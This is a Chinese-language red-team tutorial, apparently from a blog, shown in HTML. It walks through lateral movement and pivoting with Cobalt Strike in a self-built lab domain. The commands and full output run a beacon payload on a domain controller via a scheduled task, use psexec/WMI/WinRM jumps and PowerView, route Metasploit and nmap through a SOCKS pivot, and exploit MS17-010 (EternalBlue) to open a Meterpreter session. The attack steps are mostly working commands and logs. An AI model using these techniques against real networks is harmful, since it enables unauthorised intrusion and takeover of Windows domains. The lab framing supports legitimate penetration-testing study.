<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell net time \\windc</span><br><span class="line">[*] Tasked beacon to run: net time \\windc</span><br><span class="line">[+] host called home, sent: <span class="number">49</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">\\windc 的当前时间是 <span class="number">2020</span>/<span class="number">8</span>/<span class="number">30</span> <span class="number">14</span>:<span class="number">54</span>:<span class="number">09</span></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>

<p>3、创建一个计划任务</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell at \\host HH:mm C:\path\to\bad.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell at \\windc <span class="number">15</span>:<span class="number">00</span> C:\windows\temp\beacon.exe</span><br><span class="line">[*] Tasked beacon to run: at \\windc <span class="number">15</span>:<span class="number">00</span> C:\windows\temp\beacon.exe</span><br><span class="line">[+] host called home, sent: <span class="number">76</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">新加了一项作业，其作业 ID = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>4、当计划任务被执行时，执行 link hostname 即可上线主机</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; link windc</span><br><span class="line">[*] Tasked to link to \\windc\pipe\msagent_d76a</span><br><span class="line">[+] host called home, sent: <span class="number">34</span> bytes</span><br><span class="line">[+] established link to child beacon: <span class="number">192.168</span>.<span class="number">175.144</span></span><br></pre></td></tr></table></figure>

<p><strong>beacon 的自动操作</strong></p>
<p>前面说的两种执行文件的方法都需要往磁盘里上传文件，如果不想往磁盘中上传文件，也可以使用 beacon 的自动操作。</p>
<ul>
<li>使用一个服务运行可执行文件</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec [<span class="type">target</span>] [<span class="type">share</span>] [<span class="type">listener</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>使用一个服务运行 Powershell 单行程序</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec_psh [<span class="type">target</span>] [<span class="type">listener</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 WinRM 运行 Powershell 单行程序</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm [<span class="type">target</span>] [<span class="type">listener</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 WMI 运行 Powershell 单行程序</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmi [<span class="type">target</span>] [<span class="type">listener</span>]</span><br></pre></td></tr></table></figure>

<p>在 Cobalt Strike 的 <code>viwe --&gt; Targets</code> 下，右击主机选择 <code>Jump</code> 也可以通过图形化的方式进行上述操作，这样也使得横向移动更加的简单。</p>
<p>接下来进行一下演示，目前手中有一个普通机器的管理员会话，我们先在这台机器上运行 <code>net view</code> 查看一下当前域环境中的主机信息。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; net view</span><br><span class="line">[*] Tasked beacon to run net view</span><br><span class="line">[+] host called home, sent: <span class="number">104504</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">List of hosts:</span><br><span class="line">[+] received output:</span><br><span class="line"> Server Name             IP Address                       Platform  Version  <span class="built_in">Type</span>   Comment</span><br><span class="line"> <span class="literal">-----------</span>             <span class="literal">----------</span>                       <span class="literal">--------</span>  <span class="literal">-------</span>  <span class="literal">----</span>   <span class="literal">-------</span>            </span><br><span class="line"> WINDC                   <span class="number">192.168</span>.<span class="number">175.144</span>                  <span class="number">500</span>       <span class="number">6.1</span>      PDC    </span><br><span class="line"> WINTEST                 <span class="number">192.168</span>.<span class="number">175.130</span>                  <span class="number">500</span>       <span class="number">6.1</span>         </span><br></pre></td></tr></table></figure>

<p>因为是自己本地搭建的测试环境，所以主机很少，可以看到当前域中有两台机器，再利用 PowerView 查找一下具有本地管理员访问权限的用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell<span class="literal">-import</span> PowerView.ps1</span><br><span class="line">[*] Tasked beacon to import: PowerView.ps1</span><br><span class="line">[+] host called home, sent: <span class="number">101224</span> bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell <span class="built_in">Find-LocalAdminAccess</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">Find-LocalAdminAccess</span></span><br><span class="line">[+] host called home, sent: <span class="number">329</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">WinDC.teamssix.com</span><br></pre></td></tr></table></figure>

<p>接下来在 WinDC 上运行 psexec，因为这里是 64 位的，所以选择 psexec64，之后监听选择一个 smb beacon，会话就选择已经上线的 wintest 主机的会话，并勾选使用当前会话的访问令牌</p>
<p>应该是因为当前在 wintest 主机上有 windc 的管理员账户登录着，所以使用 wintest 的访问令牌是可以获取 windc 的信任的</p>
<p>之后，windc 主机就上线了，域中如果还有其他主机，也可以使用这种方法去横向移动</p>
<h5 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h5><h6 id="1、SOCKS-代理转发"><a href="#1、SOCKS-代理转发" class="headerlink" title="1、SOCKS 代理转发"></a>1、SOCKS 代理转发</h6><p>在进行转发操作之前，需要将当前会话改为交互模式，也就是说输入命令就被执行，执行 <code>sleep 0</code> 即为交互模式</p>
<p><strong>Socks</strong></p>
<ul>
<li>在当前 beacon 上可以右击选择 <code>Pivoting --&gt; SOCKS Server</code> 设置一个 Socks4a 代理服务</li>
<li>或者使用命令 <code>socks [port]</code> 进行设置</li>
<li>使用命令 <code>socks stop</code> 关闭 Socks 代理服务</li>
<li>在 <code>View --&gt; Proxy Pivots</code> 中可以看到已经创建的代理服务</li>
</ul>
<p><strong>Metasploit 连接到 Socks 代理服务</strong></p>
<ul>
<li>CS 中创建好代理后，在 Metasploit 中可以运行以下命令通过 beacon 的 Socks 代理进行通信</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks4:127.0.0.1:[port]</span><br><span class="line">setg ReverseAllowProxy true</span><br></pre></td></tr></table></figure>

<p>如果感觉上面命令比较长，还可以在 <code>Proxy Pivots</code> 界面中点击 <code>Tunnel</code> 按钮查看命令。</p>
<ul>
<li>运行以下命令来停止</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unsetg Proxies</span><br></pre></td></tr></table></figure>

<p>setg 命令和 unsetg 表示在 metasploit 中全局有效，不用在每次选择模块后再重新设置。</p>
<p><strong>演示</strong></p>
<p>1、环境说明</p>
<blockquote>
<p>攻击机 IP：192.168.175.200</p>
<p>上线主机：外部IP 192.168.175.130、内部IP 192.168.232.133</p>
<p>攻击目标：192.168.232.0&#x2F;24 地址段</p>
</blockquote>
<p>当前已经上线了一个 IP 为 192.168.175.130 主机，通过 ipconfig 发现，该主机也在 192.168.232.0&#x2F;24 地址段内，但当前攻击机无法访问 232 的地址段，因此如果想对 232 段内的主机发起攻击，就可以采用将 192.168.175.130 作为跳板机访问的方式</p>
<p>2、设置 socks 代理</p>
<p>开启交互模式  sleep 0</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">sleep</span> <span class="number">0</span></span><br><span class="line">[*] Tasked beacon to become interactive</span><br><span class="line">[+] host called home, sent: <span class="number">16</span> bytes</span><br></pre></td></tr></table></figure>

<p>开启 socks 代理  socks 9527</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; socks <span class="number">9527</span></span><br><span class="line">[+] started SOCKS4a server on: <span class="number">9527</span></span><br><span class="line">[+] host called home, sent: <span class="number">16</span> bytes</span><br></pre></td></tr></table></figure>

<p>以上操作也可以通过图形化的方式进行。</p>
<p>3、Metasploit 中进行设置</p>
<p>开启 Metasploit 后，运行 setg 命令  setg Proxies socks4:192.168.175.200:9527</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; setg Proxies socks4:<span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span></span><br><span class="line">Proxies =&gt; socks4:<span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span></span><br></pre></td></tr></table></figure>

<p>4、扫描 192.168.232.0&#x2F;24 地址段中的 445 端口</p>
<p>这里作为演示，只扫描一下 445 端口</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">set rhost 192.168.232.0/24</span><br><span class="line">set threads 64</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_version </span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; <span class="built_in">set</span> rhost <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span> </span><br><span class="line">rhost =&gt; <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; <span class="built_in">set</span> threads <span class="number">64</span></span><br><span class="line">threads =&gt; <span class="number">64</span></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; exploit </span><br><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned  <span class="number">44</span> of <span class="number">256</span> hosts (<span class="number">17</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned  <span class="number">64</span> of <span class="number">256</span> hosts (<span class="number">25</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">110</span> of <span class="number">256</span> hosts (<span class="number">42</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">111</span> of <span class="number">256</span> hosts (<span class="number">43</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">128</span> of <span class="number">256</span> hosts (<span class="number">50</span>% complete)</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.133</span>:<span class="number">445</span>   - Host is running Windows <span class="number">7</span> Ultimate SP1 (build:<span class="number">7601</span>) (name:WINTEST) (domain:TEAMSSIX) (signatures:optional)</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span>   - Host is running Windows <span class="number">2008</span> HPC SP1 (build:<span class="number">7601</span>) (name:WINDC) (domain:TEAMSSIX) (signatures:required)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">165</span> of <span class="number">256</span> hosts (<span class="number">64</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">184</span> of <span class="number">256</span> hosts (<span class="number">71</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">220</span> of <span class="number">256</span> hosts (<span class="number">85</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">249</span> of <span class="number">256</span> hosts (<span class="number">97</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">256</span> of <span class="number">256</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p>5、发现利用</p>
<p>通过扫描发现在 192.168.232.0&#x2F;24 地址段内，除了已经上线的 <code>133</code> 主机外，还有 <code>132</code> 主机也开放了 445 端口，且该主机为 Windows 2008 的操作系统，这里使用永恒之蓝作为演示。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set rhosts 192.168.232.132</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> rhosts <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit </span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - <span class="keyword">Using</span> auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span>   - Host is likely VULNERABLE to MS17<span class="literal">-010</span>! - Windows Server <span class="number">2008</span> HPC Edition <span class="number">7601</span> Service Pack <span class="number">1</span> x64 (<span class="number">64</span><span class="literal">-bit</span>)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span>   - Scanned <span class="number">1</span> of <span class="number">1</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Connecting to target <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Connection established <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Target OS selected valid <span class="keyword">for</span> OS indicated by SMB reply</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - CORE raw buffer dump (<span class="number">51</span> bytes)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - <span class="number">0</span>x00000000  <span class="number">57</span> <span class="number">69</span> <span class="number">6</span>e <span class="number">64</span> <span class="number">6</span>f <span class="number">77</span> <span class="number">73</span> <span class="number">20</span> <span class="number">53</span> <span class="number">65</span> <span class="number">72</span> <span class="number">76</span> <span class="number">65</span> <span class="number">72</span> <span class="number">20</span> <span class="number">32</span>  Windows Server <span class="number">2</span></span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - <span class="number">0</span>x00000010  <span class="number">30</span> <span class="number">30</span> <span class="number">38</span> <span class="number">20</span> <span class="number">48</span> <span class="number">50</span> <span class="number">43</span> <span class="number">20</span> <span class="number">45</span> <span class="number">64</span> <span class="number">69</span> <span class="number">74</span> <span class="number">69</span> <span class="number">6</span>f <span class="number">6</span>e <span class="number">20</span>  <span class="number">008</span> HPC Edition </span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - <span class="number">0</span>x00000020  <span class="number">37</span> <span class="number">36</span> <span class="number">30</span> <span class="number">31</span> <span class="number">20</span> <span class="number">53</span> <span class="number">65</span> <span class="number">72</span> <span class="number">76</span> <span class="number">69</span> <span class="number">63</span> <span class="number">65</span> <span class="number">20</span> <span class="number">50</span> <span class="number">61</span> <span class="number">63</span>  <span class="number">7601</span> Service Pac</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - <span class="number">0</span>x00000030  <span class="number">6</span>b <span class="number">20</span> <span class="number">31</span>                                         k <span class="number">1</span>             </span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Target arch selected valid <span class="keyword">for</span> arch indicated by DCE/RPC reply</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Trying exploit with <span class="number">12</span> Groom Allocations.</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Sending all but last fragment of exploit packet</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Starting non<span class="literal">-paged</span> pool grooming</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Sending SMBv2 buffers</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Sending final SMBv2 buffers.</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Sending last fragment of exploit packet!</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Receiving response from exploit packet</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - ETERNALBLUE overwrite completed successfully (<span class="number">0</span>xC000000D)!</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Sending egg to corrupted connection.</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Triggering free of corrupted buffer.</span><br><span class="line">[*] Started bind TCP handler against <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">4444</span></span><br><span class="line">[*] Sending stage (<span class="number">201283</span> bytes) to <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">0</span> -&gt; <span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span>) at <span class="number">2020</span><span class="literal">-09-01</span> <span class="number">22</span>:<span class="number">13</span>:<span class="number">57</span> <span class="literal">-0400</span></span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=<span class="literal">-WIN-</span>=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">Interface <span class="number">11</span></span><br><span class="line">============</span><br><span class="line">Name         : Intel(<span class="built_in">R</span>) PRO/<span class="number">1000</span> MT Network Connection</span><br><span class="line">Hardware MAC : <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:d3:<span class="number">6</span>c:<span class="number">3</span>d</span><br><span class="line">MTU          : <span class="number">1500</span></span><br><span class="line">IPv4 Address : <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line">IPv4 Netmask : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">IPv6 Address : fe80::a1<span class="built_in">ac</span>:<span class="number">3035</span>:cbdf:<span class="number">4872</span></span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></pre></td></tr></table></figure>



<p><strong>使用 ProxyChains 进行代理转发</strong></p>
<p>使用 ProxyChains 可以使我们为没有代理配置功能的软件强制使用代理</p>
<ol>
<li>和上一节中介绍的一致，开启一个 socks 代理服务</li>
<li>配置 <code>/etc/proxychains.conf</code> 文件</li>
<li>运行 <code>proxychains + 待执行命令</code></li>
</ol>
<p>接下来继续上一节中的演示环境：</p>
<blockquote>
<p>攻击机 IP：192.168.175.200</p>
<p>上线主机：外部IP 192.168.175.130、内部IP 192.168.232.133</p>
<p>攻击目标：192.168.232.0&#x2F;24 地址段</p>
</blockquote>
<p>1、设置 socks 代理</p>
<p>首先开启交互模式，之后开启 socks 代理</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep 0</span><br><span class="line">socks 9527</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">sleep</span> <span class="number">0</span></span><br><span class="line">[*] Tasked beacon to become interactive</span><br><span class="line">[+] host called home, sent: <span class="number">16</span> bytes</span><br><span class="line">beacon&gt; socks <span class="number">9527</span></span><br><span class="line">[+] host called home, sent: <span class="number">16</span> bytes</span><br><span class="line">[+] started SOCKS4a server on: <span class="number">9527</span></span><br></pre></td></tr></table></figure>

<p>2、配置 ProxyChains</p>
<p>在攻击机上，配置 <code>/etc/proxychains.conf</code> 文件的最后一行，根据当前攻击主机 IP 与设置的 Socks 端口，修改如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 192.168.175.200 9527</span><br></pre></td></tr></table></figure>

<p>3、开始使用 ProxyChains</p>
<p>根据上一节使用 Metasploit 的扫描可以知道，在 192.168.232.0&#x2F;24 地址段中存在主机 192.168.232.132 ，接下来使用 nmap 扫描一下常见的端口，这里以 80,443,445,3389 作为演示。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 192.168.232.132 -p 80,443,445,3389</span><br></pre></td></tr></table></figure>

<blockquote>
<p>-sT：使用 TCP 扫描</p>
<p>-Pn：不使用 Ping</p>
<p>-p：指定扫描端口</p>
<p>注：不加上 -sT -Pn 参数，将无法使用 proxychains 进行代理扫描</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt; proxychains nmap <span class="literal">-sT</span> <span class="literal">-Pn</span> <span class="number">192.168</span>.<span class="number">232.132</span> <span class="literal">-p</span> <span class="number">80</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">3389</span>                       </span><br><span class="line">[<span class="type">proxychains</span>] config file found: /etc/proxychains.conf</span><br><span class="line">[<span class="type">proxychains</span>] preloading /usr/lib/x86_64<span class="literal">-linux-gnu</span>/libproxychains.so.<span class="number">4</span></span><br><span class="line">[<span class="type">proxychains</span>] DLL init: proxychains<span class="literal">-ng</span> <span class="number">4.14</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https://nmap.org ) at <span class="number">2020</span><span class="literal">-09-07</span> <span class="number">23</span>:<span class="number">05</span> EDT</span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span>  ...  <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">80</span>  ...  OK</span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span>  ...  <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span>  ...  OK</span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span>  ...  <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">3389</span>  ...  OK</span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span>  ...  <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">443</span> &lt;<span class="literal">--denied</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line">Host is up (<span class="number">0.19</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line"><span class="number">80</span>/tcp   open   http</span><br><span class="line"><span class="number">443</span>/tcp  closed https</span><br><span class="line"><span class="number">445</span>/tcp  open   microsoft<span class="literal">-ds</span></span><br><span class="line"><span class="number">3389</span>/tcp open   ms<span class="literal">-wbt-server</span></span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">14.35</span> seconds</span><br></pre></td></tr></table></figure>

<p>通过扫描可以看到目标 80 端口是开放的，接下来使用 curl 作为对比示例。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.232.132</span><br><span class="line">proxychains curl 192.168.232.132</span><br></pre></td></tr></table></figure>

